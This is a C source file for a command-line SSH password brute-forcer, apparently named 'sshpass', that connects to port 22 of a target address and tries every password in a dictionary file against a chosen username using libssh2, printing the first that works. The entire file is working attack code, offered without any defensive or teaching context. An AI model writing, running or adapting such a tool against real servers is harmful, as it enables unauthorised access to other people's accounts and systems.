#include "status.h"
#include "tcp.h"
#include "lines.h"
#include "ssh.h"
#include <unistd.h>
#include <pthread.h>

typedef struct bruteforce_data_t {
	int             ssh_socket;
	const char*     username;
	FILE*           dict_file;
	pthread_mutex_t dict_mutex;

	int             active_threads;
	pthread_mutex_t done_mutex;
	pthread_cond_t  done;
	status_t        status;
	line_t          password;
} bruteforce_data_t;

void free_ssh (void* _session)
{
	LIBSSH2_SESSION* session = _session;
	libssh2_session_free (session);
}

void disconnect_ssh (void* _session)
{
	LIBSSH2_SESSION* session = _session;
	libssh2_session_disconnect (session, "Disconnect by application");
}

status_t bruteforce_core (line_t (*the_password), void* _data)
{
	bruteforce_data_t* data = _data;
	status_t status = success ();

	LIBSSH2_SESSION* session = libssh2_session_init ();
	if (session == NULL) {
		status = failure ("Failed to initialize an SSH session");
		goto end;
	}
	pthread_cleanup_push (&free_ssh, session);

	if (libssh2_session_startup (session, data->ssh_socket) != 0) {
		status = sshfailure (session);
		goto free;
	}
	pthread_cleanup_push (&disconnect_ssh, session);

	const char* userauth_list = libssh2_userauth_list (session, data->username, strlen (data->username));
	if (strstr (userauth_list, "password") == NULL) { // TODO: commas
		status = failure ("The SSH server does not support passwords");
		goto disconnect;
	}

	line_t line;
	status = make_line (&line);
	if (failed (status))
		goto disconnect;
	(*the_password) = line;

	while (1) {
		if (pthread_mutex_lock (&data->dict_mutex) != 0) {
			status = failure ("Failed to lock dictionary mutex");
			goto disconnect;
		}
		status = get_line (&line, data->dict_file);
		int eof = feof (data->dict_file);
		if (pthread_mutex_unlock (&data->dict_mutex) != 0) {
			status = failure ("Failed to unlock dictionary mutex");
			goto disconnect;
		}

		if (failed (status) || eof)
			goto disconnect;

		const char* password = line.ntbs;
		if (libssh2_userauth_password (session, data->username, password) >= 0) {
			(*the_password) = line;
			goto disconnect;
		}
	}

disconnect:
	pthread_cleanup_pop (1);
free:
	pthread_cleanup_pop (1);
end:
	return status;
}

void* bruteforce_thread (void* _data)
{
	bruteforce_data_t* data = _data;
	line_t the_password;
	status_t status = bruteforce_core (&the_password, _data);

	raw_check (pthread_mutex_lock (&data->done_mutex) == 0, "Failed to lock \"done\" mutex");
	{
		bool all_done = false;

		--data->active_threads;
		if (data->active_threads == 0)
			all_done = true;

		if (failed (status)) {
			if (!failed (data->status))
				data->status = status;
			all_done = true;
		}

		if (!failed (status) && the_password.ntbs != NULL) {
			if (data->password.ntbs == NULL)
				data->password = the_password;
			all_done = true;
		}

		if (all_done)
			raw_check (pthread_cond_signal (&data->done) == 0, "Failed to signal \"done\"");
	}
	raw_check (pthread_mutex_unlock (&data->done_mutex) == 0, "Failed to unlock \"done\" mutex");

	return NULL;
}

status_t bruteforce (line_t (*password), int ssh_socket, const char* username, FILE* dict_file, int nthreads)
{
	// FIXME
	nthreads = 1;

	bruteforce_data_t data = {
		.ssh_socket     = ssh_socket,
		.username       = username,
		.dict_file      = dict_file,
		.dict_mutex     = PTHREAD_MUTEX_INITIALIZER,
		.active_threads = nthreads,
		.done_mutex     = PTHREAD_MUTEX_INITIALIZER,
		.done           = PTHREAD_COND_INITIALIZER,
		.status         = success ()
	};
	status_t status = make_line (&data.password);
	if (failed (status))
		return status;

	pthread_t thd;
	if (pthread_mutex_lock (&data.done_mutex) != 0)
		return failure ("Failed to lock \"done\" mutex");
	{
		if (pthread_create (&thd, NULL, &bruteforce_thread, &data) != 0){
			status = failure ("Failed to create bruteforce thread");
			goto done;
		}

		if (pthread_cond_wait (&data.done, &data.done_mutex) != 0) {
			status = failure ("Failed to wait on \"done\"");
			goto done;
		}
	}
done:
	if (pthread_cancel (thd) != 0)
		status = failure ("Failed to cancel bruteforce thread");
	if (pthread_join (thd, NULL) != 0)
		status = failure ("Failed to join bruteforce thread");
	if (pthread_mutex_unlock (&data.done_mutex) != 0)
		return failure ("Failed to unlock \"done\" mutex");
	if (failed (status))
		return status;

	if (failed (data.status))
		return data.status;
	if (data.password.ntbs == NULL)
		return failure ("No supplied password succeeded");

	(*password) = data.password;
	return success ();
}



status_t get_args (const char* (*address),
                   const char* (*username),
                   const char* (*dict_filename),
                   int argc, const char* const* argv)
{
	if (argc != 4)
		return failure (NULL);

	(*address) = argv [1];
	(*username) = argv [2];
	(*dict_filename) = argv [3];
	return success ();
}

int main (int argc, const char* const* argv)
{
	const char* address = NULL;
	const char* username = NULL;
	const char* dict_filename = NULL;
	check (get_args (&address, &username, &dict_filename, argc, argv),
	       "Usage: sshpass address username dict_file");

	int ssh_socket = -1;
	check (connect_tcp (&ssh_socket, address, "22"),
	       "Could not connect to %s:%s", address, "22");

	FILE* dict_file = fopen (dict_filename, "r");
	raw_check (dict_file != NULL, "Could not open %s for reading", dict_filename);

	line_t password;
	check (bruteforce (&password, ssh_socket, username, dict_file, 1),
	       "Could not bruteforce ssh:%s@%s", username, address);

	printf ("Password: %s\n", password.ntbs);

	close (ssh_socket);
	fclose (dict_file);
	return EXIT_SUCCESS;
}
